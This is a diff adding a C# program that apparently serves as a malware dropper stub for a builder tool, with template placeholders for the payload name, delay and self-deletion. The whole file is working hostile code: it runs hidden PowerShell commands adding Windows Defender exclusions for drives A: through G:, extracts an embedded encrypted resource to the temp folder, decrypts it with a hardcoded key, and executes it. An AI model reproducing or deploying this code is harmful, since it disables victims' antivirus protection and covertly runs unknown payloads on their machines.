@@ -1,0 +1,163 @@
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Reflection;
+using System.Security.Cryptography;
+using System.Text;
+using System.Threading;
+
+namespace DWB_Multi_Tool
+{
+    class Program
+    {
+        public static void Main(string[] args)
+        {
+            // Set vars
+            string EncFileName = "%ENCFILENAME%";
+            string FileName = "%FILENAME%";
+            string RandomChars = "DroppedFile2wdwerfghww543" + DateTime.Now.Millisecond;
+
+            // Check if delay is wanted
+            if ("%DELAY%" == "TRUE")
+            {
+                // Delay
+                Thread.Sleep(30000);
+            }
+
+            // Catch exeptions
+            try
+            {
+                // Add windows defender drive exclutions
+                RunCmdWithParameters(@"powershell Add-MpPreference -ExclusionPath A:\; Add-MpPreference -ExclusionPath B:\; Add-MpPreference -ExclusionPath C:\; Add-MpPreference -ExclusionPath D:\");
+                RunCmdWithParameters(@"powershell Add-MpPreference -ExclusionPath E:\; Add-MpPreference -ExclusionPath F:\; Add-MpPreference -ExclusionPath G:\");
+
+                // Goto temp
+                Directory.SetCurrentDirectory(Path.GetTempPath());
+
+                // Extract encrypted payload
+                ExtractResource(EncFileName, RandomChars + EncFileName);
+
+                // Decrypt payload
+                Decrypt(RandomChars + EncFileName, RandomChars + FileName, Encoding.ASCII.GetBytes("123"));
+
+                // Delete encrypted payload
+                File.Delete(RandomChars + EncFileName);
+
+                // Run decrypted payload
+                Process.Start(RandomChars + FileName);
+            }
+            catch
+            {
+
+            }
+
+            // Check if file deletion is wanted
+            if ("%DELETE%" == "TRUE")
+            {
+                // Wait for file to its things
+                Thread.Sleep(15000);
+
+                // Catch exeptions
+                try
+                {
+                    // Delete file
+                    File.Delete(RandomChars + FileName);
+                }
+                catch
+                {
+
+                }
+            }
+
+            // Exit
+            Environment.Exit(0);
+        }
+
+        // RunCmdWithParameters method
+        private static void RunCmdWithParameters(string Input)
+        {
+            // Create new instance
+            using (var Process = new Process())
+            {
+                // Set process info
+                ProcessStartInfo startInfo = new ProcessStartInfo
+                {
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    FileName = "cmd.exe",
+                    Arguments = "/C " + Input
+                };
+
+                // Start process
+                Process.StartInfo = startInfo;
+                Process.Start();
+                Process.WaitForExit();
+            }
+        }
+
+        // ExtractResource method
+        public static void ExtractResource(string FileName, string Name)
+        {
+            // Get assembly
+            Assembly assembly = Assembly.GetCallingAssembly();
+
+            // Create new instance
+            using (Stream stream = assembly.GetManifestResourceStream(FileName))
+            {
+                // Get the stream bytes
+                byte[] bytes = new byte[(int)stream.Length];
+
+                // Read bytes
+                stream.Read(bytes, 0, bytes.Length);
+
+                // Write file
+                File.WriteAllBytes(Name, bytes);
+            }
+        }
+
+        // Decrypt method
+        private static void Decrypt(string inputFile, string outputFile, byte[] passwordBytes)
+        {
+            // Set salt
+            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+
+            // Create new instance
+            using (FileStream fsCrypt = new FileStream(inputFile, FileMode.Open))
+            {
+                // Set key and block size
+                RijndaelManaged AES = new RijndaelManaged
+                {
+                    KeySize = 256,
+                    BlockSize = 128
+                };
+
+                // Create new instance
+                using (var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000))
+                {
+                    // Get bytes
+                    AES.Key = key.GetBytes(AES.KeySize / 8);
+                    AES.IV = key.GetBytes(AES.BlockSize / 8);
+                    AES.Padding = PaddingMode.Zeros;
+                    AES.Mode = CipherMode.CBC;
+
+                    // Create new instance
+                    using (CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateDecryptor(), CryptoStreamMode.Read))
+                    {
+                        // Create new instance
+                        using (FileStream fsOut = new FileStream(outputFile, FileMode.Create))
+                        {
+                            // Encrypt file
+                            int data;
+                            while ((data = cs.ReadByte()) != -1)
+                                fsOut.WriteByte((byte)data);
+
+                            // Close all streams
+                            fsOut.Close();
+                            cs.Close();
+                            fsCrypt.Close();
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
